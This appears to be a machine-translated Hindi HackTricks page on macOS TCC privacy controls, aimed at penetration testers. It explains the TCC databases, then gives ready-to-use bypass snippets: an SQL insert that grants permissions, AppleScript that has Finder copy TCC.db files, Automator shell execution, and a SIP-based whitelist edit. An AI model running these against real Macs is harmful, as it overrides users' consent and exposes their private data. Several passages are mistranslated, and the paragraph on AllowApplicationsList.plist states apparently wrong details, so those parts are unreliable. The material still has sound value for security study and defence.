# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

## **मूलभूत जानकारी**

**TCC (Transparency, Consent, and Control)** मैकओएस में एक तंत्र है जो **निश्चित सुविधाओं तक एप्लिकेशन का पहुंच सीमित और नियंत्रित करने** के लिए होता है, आमतौर पर एक गोपनीयता के दृष्टिकोण से। इसमें स्थान सेवाएं, संपर्क, फ़ोटो, माइक्रोफ़ोन, कैमरा, पहुंचियोंता, पूर्ण डिस्क पहुंच और बहुत कुछ शामिल हो सकता है।

उपयोगकर्ता के दृष्टिकोण से, वे TCC को कार्रवाई में देखते हैं **जब एक ऐप्लिकेशन TCC द्वारा संरक्षित सुविधा तक पहुंच चाहता है**। जब ऐसा होता है, तो **उपयोगकर्ता को प्रश्न पूछा जाता है** कि क्या वह पहुंच को अनुमति देना चाहते हैं या नहीं।

यह भी संभव है कि उपयोगकर्ता द्वारा **उपयोगकर्ता के द्वारा स्पष्ट इरादों** से ऐप्स को फ़ाइलों तक पहुंच दी जाए (स्वाभाविक रूप से प्रोग्राम को इसकी पहुंच होनी चाहिए)।

![TCC प्रॉम्प्ट का एक उदाहरण](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** को **डेमन** द्वारा हैंडल किया जाता है जो `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` में स्थित होता है और `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` में कॉन्फ़िगर किया जाता है (मशीन सेवा `com.apple.tccd.system` को पंजीकृत करना)।

यहां आप सिस्टम और उपयोगकर्ता के रूप में चल रहे tccd को देख सकते हैं:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
अनुमतियाँ **मूल एप्लिकेशन से विरासत में आती हैं** और अनुमतियाँ **बंडल आईडी** और **डेवलपर आईडी** के आधार पर **ट्रैक की जाती हैं**।

### TCC डेटाबेस

अनुमतियाँ फिर **कुछ TCC डेटाबेस में संग्रहीत** होती हैं:

* **`/Library/Application Support/com.apple.TCC/TCC.db`** में सिस्टम-वाइड डेटाबेस।
* इस डेटाबेस को **SIP सुरक्षित** किया गया है, इसलिए केवल SIP बाईपास इसे लिख सकता है।
* प्रति-उपयोगकर्ता प्राथमिकताओं के लिए उपयोगकर्ता TCC डेटाबेस **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**।
* इस डेटाबेस को सुरक्षित किया गया है, इसलिए केवल पूर्ण डिस्क पहुंच जैसी उच्च TCC विशेषाधिकार वाले प्रक्रियाएं इसे लिख सकती हैं (लेकिन इसे SIP द्वारा सुरक्षित नहीं किया गया है)।

{% hint style="warning" %}
पिछले डेटाबेसों को पढ़ने के लिए भी **TCC द्वारा संरक्षित हैं**। इसलिए आप **आपके सामान्य उपयोगकर्ता TCC डेटाबेस को पढ़ नहीं पाएंगे** जब तक यह TCC विशेषाधिकार वाली प्रक्रिया से नहीं है।

हालांकि, ध्यान दें कि इन उच्च विशेषाधिकारों वाली प्रक्रियाओं (जैसे **FDA** या **`kTCCServiceEndpointSecurityClient`**) के पास उपयोगकर्ताओं के TCC डेटाबेस को लिखने की क्षमता होगी।
{% endhint %}

* **`/var/db/locationd/clients.plist`** में तीसरा TCC डेटाबेस है जो स्थान सेवाओं तक पहुंच की अनुमति देता है।
* SIP सुरक्षित फ़ाइल **`/Users/carlospolop/Downloads/REG.db`** (जिसे TCC द्वारा पढ़ने की अनुमति भी नहीं है) में सभी मान्य TCC डेटाबेस का स्थान होता है।
* SIP सुरक्षित फ़ाइल **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (जिसे TCC द्वारा पढ़ने की अनुमति भी नहीं है) में अधिक TCC अनुमतियाँ होती हैं।
* SIP सुरक्षित फ़ाइल **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (किसी भी व्यक्ति द्वारा पढ़ने योग्य) एक ऐसी सूची है जिसमें TCC अपवाद की आवश्यकता वाले एप्लिकेशनों की सूची होती है।&#x20;

{% hint style="success" %}
**iOS** में TCC डेटाबेस **`/private/var/mobile/Library/TCC/TCC.db`** में होता है।
{% endhint %}

{% hint style="info" %}
**नोटिफ़िकेशन सेंटर UI** सिस्टम TCC डेटाबेस में **परिवर्तन कर सकता है**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

हालांकि, उपयोगकर्ता नियमों को **`tccutil`** कमांड लाइन उपयोगिता के साथ **हटा सकते या प्रश्न कर सकते हैं**।
{% endhint %}

#### डेटाबेस का प्रश्न करें

{% tabs %}
{% tab title="उपयोगकर्ता डेटाबेस" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="सिस्टम डीबी" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
दोनों डेटाबेसों की जांच करके आप एक ऐप की अनुमतियों की जांच कर सकते हैं, जिन्हें उसने अनुमति दी है, मना की है या जिन्हें उसे चाहिए (यह उससे पूछेगा)।
{% endhint %}

* **`सेवा`** TCC **अनुमति** स्ट्रिंग प्रतिष्ठान है
* **`ग्राहक`** अनुमतियों के साथ **बंडल आईडी** या **बाइनरी के पथ** है
* **`ग्राहक प्रकार`** यह दर्शाता है कि यह बंडल पहचानकर्ता (0) है या एक पूर्ण पथ (1)

<details>

<summary>यदि यह एक पूर्ण पथ है तो कैसे निष्पादित करें</summary>

बस **`launctl load you_bin.plist`** करें, एक plist के साथ जैसे:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* **`auth_value`** कई अलग-अलग मान ले सकता है: निषेधित(0), अज्ञात(1), अनुमति दी गई(2), या सीमित(3).
* **`auth_reason`** निम्नलिखित मान ले सकता है: त्रुटि(1), उपयोगकर्ता सहमति(2), उपयोगकर्ता ने सेट किया(3), सिस्टम ने सेट किया(4), सेवा नीति(5), MDM नीति(6), ओवरराइड नीति(7), अनुपयोग स्ट्रिंग गुम है(8), प्रॉम्प्ट समय समाप्ति(9), प्रीफ्लाइट अज्ञात(10), अधिकृत(11), ऐप के प्रकार नीति(12)
* **csreq** फ़ील्ड यह दर्शाता है कि कैसे बाइनरी को सत्यापित करें और TCC अनुमतियाँ प्रदान करें:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* टेबल के **अन्य फ़ील्डों** के बारे में अधिक जानकारी के लिए [**इस ब्लॉग पोस्ट**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive) की जांच करें।

आप `System Preferences --> Security & Privacy --> Privacy --> Files and Folders` में ऐप्स को **पहले से दिए गए अनुमतियों** की जांच भी कर सकते हैं।

{% hint style="success" %}
उपयोगकर्ता **`tccutil`** का उपयोग करके **नियमों को हटा सकते या क्वेरी कर सकते हैं**।
{% endhint %}

#### TCC अनुमतियाँ रीसेट करें
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC हस्ताक्षर जांच

TCC **डेटाबेस** में एप्लिकेशन के **बंडल आईडी** को संग्रहीत किया जाता है, लेकिन यह भी **हस्ताक्षर** के बारे में **जानकारी** संग्रहीत करता है ताकि अनुमति का उपयोग करने के लिए अप्लिकेशन सही हो।

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
इसलिए, एक ही नाम और बंडल आईडी का उपयोग करने वाले अन्य एप्लिकेशन अन्य ऐप्स को दिए गए अनुमतियों तक पहुंच नहीं पा सकेंगे।
{% endhint %}

### अधिकाराधिकार और TCC अनुमतियाँ

ऐप्स को केवल कुछ संसाधनों के लिए अनुरोध करने और उन्हें पहुंच दिए जाने के लिए ही नहीं होता है, उन्हें संबंधित अधिकाराधिकार भी होने चाहिए।\
उदाहरण के लिए, **Telegram** के पास `com.apple.security.device.camera` अधिकाराधिकार है जिसका उपयोग **कैमरे तक पहुंच के लिए** करने के लिए किया जाता है। एक ऐप जिसमें यह अधिकाराधिकार नहीं है, वह कैमरे तक पहुंच नहीं पा सकेगी (और उपयोगकर्ता को अनुमतियों के लिए पूछा नहीं जाएगा)।

हालांकि, ऐप्स को `~/Desktop`, `~/Downloads` और `~/Documents` जैसे कुछ उपयोगकर्ता फ़ोल्डरों तक पहुंच करने के लिए किसी भी विशेष अधिकाराधिकार की आवश्यकता नहीं होती है। सिस्टम स्वतः ही पहुंच को संचालित करेगा और उपयोगकर्ता को आवश्यकतानुसार प्रश्नित करेगा।

एप्पल के ऐप्स प्रश्नित करने की उत्पन्न नहीं करेंगे। उनमें उनकी अधिकाराधिकार सूची में पूर्व-दिए गए अधिकार होते हैं, जिसका मतलब है कि वे कभी भी एक पॉपअप उत्पन्न नहीं करेंगे, और वे किसी भी TCC डेटाबेस में दिखाई नहीं देंगे। उदाहरण के लिए:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
यह यह सुनिश्चित करेगा कि कैलेंडर उपयोगकर्ता से यादें, कैलेंडर और पता-पुस्तिका तक पहुंच करने के लिए पूछता नहीं है।

{% hint style="success" %}
इंटाइटलमेंट्स के बारे में कुछ आधिकारिक दस्तावेज़ीकरण के अलावा, आप इंटाइटलमेंट्स के बारे में अनौपचारिक **रोचक जानकारी भी पा सकते हैं** [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl) में
{% endhint %}

कुछ TCC अनुमतियाँ हैं: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... इनमें सभी की परिभाषा करने वाली कोई सार्वजनिक सूची नहीं है, लेकिन आप इस [**ज्ञात सूची**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service) की जांच कर सकते हैं।

### संवेदनशील असुरक्षित स्थान

* $HOME (खुद)
* $HOME/.ssh, $HOME/.aws, आदि
* /tmp

### उपयोगकर्ता की इच्छा / com.apple.macl

पहले ही उल्लिखित तरीके से, एक ऐप को एक फ़ाइल तक पहुंच देने के लिए उसे उठाकर ड्रॉप करके इसे संभव बनाया जा सकता है। इस पहुंच को किसी भी TCC डेटाबेस में निर्दिष्ट नहीं किया जाएगा, बल्कि फ़ाइल के **विस्तारित गुण** के रूप में एक **UUID** को संग्रहीत किया जाएगा।
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
यह अद्वितीय है कि **`com.apple.macl`** विशेषता को **Sandbox** द्वारा प्रबंधित किया जाता है, न कि tccd द्वारा।

इसके अलावा ध्यान दें कि यदि आप एक फ़ाइल को अपने कंप्यूटर में एक अलग कंप्यूटर में एक ऐप के UUID की अनुमति देती हैं, क्योंकि एक ही ऐप के लिए अलग-अलग UIDs होंगे, तो उस ऐप को पहुंच नहीं मिलेगी।
{% endhint %}

विस्तारित विशेषता `com.apple.macl` को अन्य विस्तारित विशेषताओं की तरह **हटाया नहीं जा सकता** क्योंकि इसे **SIP द्वारा संरक्षित** किया जाता है। हालांकि, जैसा कि [**इस पोस्ट में समझाया गया है**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), इसे अक्षुण करने के लिए फ़ाइल को **ज़िप** करके, उसे **हटाकर** और फिर से **अनज़िप** करके संभव है।

## TCC Privesc & Bypasses

### TCC में डालें

यदि किसी बिंदु पर आपको TCC डेटाबेस पर लिखने की पहुंच होती है, तो आप निम्नलिखित की तरह एक प्रविष्टि जोड़ सकते हैं (टिप्पणियाँ हटा दें):

<details>

<summary>उदाहरण में TCC में डालें</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### एफडीए के लिए स्वचालन

ऑटोमेशन अनुमति का TCC नाम है: **`kTCCServiceAppleEvents`**\
यह विशेष TCC अनुमति भी इंद्रजालिक डेटाबेस के अंदर प्रबंधित किए जा सकने वाले **एप्लिकेशन** को दर्शाती है (तो अनुमतियाँ सब कुछ प्रबंधित करने की अनुमति नहीं देती है)।

**फ़ाइंडर** एक ऐसा एप्लिकेशन है जिसके पास **हमेशा एफडीए होता है** (यदि यह UI में नहीं दिखाई देता है तो भी), इसलिए यदि आपके पास इसके ऊपर **ऑटोमेशन** अनुमति है, तो आप इसकी अनुमतियों का दुरुपयोग करके इसे **कुछ कार्रवाई करने के लिए मजबूर** कर सकते हैं।\
इस मामले में आपके ऐप को **`com.apple.Finder`** पर **`kTCCServiceAppleEvents`** अनुमति की आवश्यकता होगी।

{% tabs %}
{% tab title="उपयोगकर्ताओं के TCC.db चुराएं" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="सिस्टम TCC.db चुराएँ" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

आप इसे दुरुपयोग कर सकते हैं ताकि आप अपना खुद का उपयोगकर्ता TCC डेटाबेस लिख सकें।

{% hint style="warning" %}
इस अनुमति के साथ आप **फाइंडर से TCC प्रतिबंधित फ़ोल्डरों तक पहुंचने के लिए पूछ सकेंगे** और आपको फ़ाइलें दे सकेंगे, लेकिन जैसा कि मुझे पता है, आप **फाइंडर को विभिन्न कोड को नहीं चला सकेंगे** ताकि आप उसके FDA पहुंच का पूरा दुरुपयोग कर सकें।

इसलिए, आप FDA की पूरी क्षमताओं का दुरुपयोग नहीं कर सकेंगे।
{% endhint %}

यहां फाइंडर पर Automation विशेषाधिकार प्राप्त करने के लिए TCC प्रॉम्प्ट है:

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
ध्यान दें कि क्योंकि **Automator** ऐप के पास TCC अनुमति **`kTCCServiceAppleEvents`** है, इसलिए यह **किसी भी ऐप** को नियंत्रित कर सकता है, जैसे कि फाइंडर। इसलिए, Automator को नियंत्रित करने की अनुमति होने पर आप निम्नलिखित कोड के साथ **फाइंडर** को भी नियंत्रित कर सकते हैं:
{% endhint %}

<details>

<summary>Automator में शेल प्राप्त करें</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

यही बात **स्क्रिप्ट संपादक ऐप** के साथ भी होती है, यह फाइंडर को नियंत्रित कर सकता है, लेकिन एक AppleScript का उपयोग करके आप इसे एक स्क्रिप्ट को निष्पादित करने के लिए मजबूर नहीं कर सकते।

### **ईंधन सुरक्षा क्लाइंट से FDA**

यदि आपके पास **`kTCCServiceEndpointSecurityClient`** है, तो आपके पास FDA है। समाप्त।

### सिस्टम नीति सिसएडमिन फ़ाइल से FDA

**`kTCCServiceSystemPolicySysAdminFiles`** एक उपयोगकर्ता के **`NFSHomeDirectory`** विशेषता को **बदलने** की अनुमति देता है जो उसके होम फ़ोल्डर को बदलता है और इसलिए TCC को **दौरा करने की अनुमति देता है**।

### उपयोगकर्ता TCC डीबी से FDA

उपयोगकर्ता TCC डेटाबेस पर **लेखन अनुमति** प्राप्त करके आप खुद को **`FDA`** अनुमतियों की प्राप्ति नहीं कर सकते, केवल सिस्टम डेटाबेस में रहने वाला व्यक्ति उसे प्रदान कर सकता है।

लेकिन आप खुद को **`फ़ाइंडर के लिए स्वचालन अधिकार`** दे सकते हैं, और FDA की ऊपरी तकनीक का दुरुपयोग करके FDA की ओर उन्नयन कर सकते हैं\*।

### **FDA से TCC अनुमतियाँ**

TCC में **पूर्ण डिस्क पहुंच** का नाम है **`kTCCServiceSystemPolicyAllFiles`**

मुझे लगता है कि यह एक वास्तविक प्राइवेसी नहीं है, लेकिन यदि आपके पास FDA के साथ एक प्रोग्राम का नियंत्रण है तो आप **उपयोगकर्ता TCC डेटाबेस को संशोधित करके खुद को किसी भी पहुंच** दे सकते हैं। यह आपके लिए एक स्थायित्व तकनीक के रूप में उपयोगी हो सकता है यदि आपको अपनी FDA अनुमतियों को खो देने का संभावना हो सकता है।

### **SIP बाईपास से TCC बाईपास**

सिस्टम **TCC डेटाबेस** SIP द्वारा संरक्षित है, इसलिए केवल उन प्रक्रियाओं को ही इसे संशोधित करने की अनुमति होगी जिनमें **निर्दिष्ट अधिकार** होंगे। इसलिए, यदि हमलावर को SIP के द्वारा प्रतिबंधित एक **फ़ाइल** पर SIP बाईपास मिल जाता है, तो वह कर सकेगा:

* TCC डेटाबेस की **सुरक्षा हटा दें**, और खुद को सभी TCC अनुमतियाँ दें। उदाहरण के लिए, वह किसी भी इन फ़ाइलों का दुरुपयोग कर सकता है:
* TCC सिस्टम डेटाबेस
* REG.db
* MDMOverrides.plist

हालांकि, इस **SIP बाईपास को TCC बाईपास** का दुरुपयोग करने के लिए एक और विकल्प है, फ़ाइल `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` एक ऐसी अनुमति वाली अनुप्रयोग सूची है जिसमें TCC छूट की आवश्यकता होती है। इसलिए, यदि हमलावर इस फ़ाइल से SIP संरक्षण को **हटा सकता है** और अपना **खुद का अनुप्रयोग** जोड़ सकता है, तो अनुप्रयोग TCC को छू सकेगा।\
उदाहरण के लिए टर्मिनल जोड़ने के लिए:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

यह प्लिस्ट फ़ाइल एक मैपिंग टेबल है जो macOS के ट्रांसपेरेंट कंप्यूटिंग कंट्रोल (TCC) फ्रेमवर्क के लिए अनुमति दी जाने वाली अनुप्रयोगों की सूची को संग्रहित करती है। TCC उपयोगकर्ता द्वारा दी गई अनुमतियों को प्रबंधित करता है जो उपयोगकर्ता डेटा और सुरक्षा को संरक्षित रखने के लिए आवश्यक होती हैं। इस फ़ाइल में अनुप्रयोगों की सूची होती है जिन्हें TCC द्वारा अनुमति दी जाती है ताकि वे उपयोगकर्ता डेटा तक पहुंच सकें।

यहां दी गई फ़ाइल में प्रत्येक अनुप्रयोग के लिए एक एंट्री होती है जिसमें अनुप्रयोग का बाईनरी पथ और अनुमति स्तर दिया जाता है। अनुमति स्तर विकल्पों में से एक हो सकता है: 'allowed' (अनुमति दी गई है), 'denied' (अनुमति नहीं दी गई है), या 'prompt' (उपयोगकर्ता को पूछें जाएगा)।

यदि आप इस फ़ाइल में अनुप्रयोगों को जोड़ना, हटाना या संपादित करना चाहते हैं, तो आपको इसे सुरक्षित रूप से करना चाहिए और फ़ाइल को /Library/Application Support/com.apple.TCC/ या ~/Library/Application Support/com.apple.TCC/ में स्थानांतरित करना चाहिए। फ़ाइल को संपादित करने के बाद, आपको एक बार लॉगआउट और लॉगइन करना होगा ताकि बदलाव प्रभावी हो सकें।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC बाईपास

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## संदर्भ

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** हो? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**.
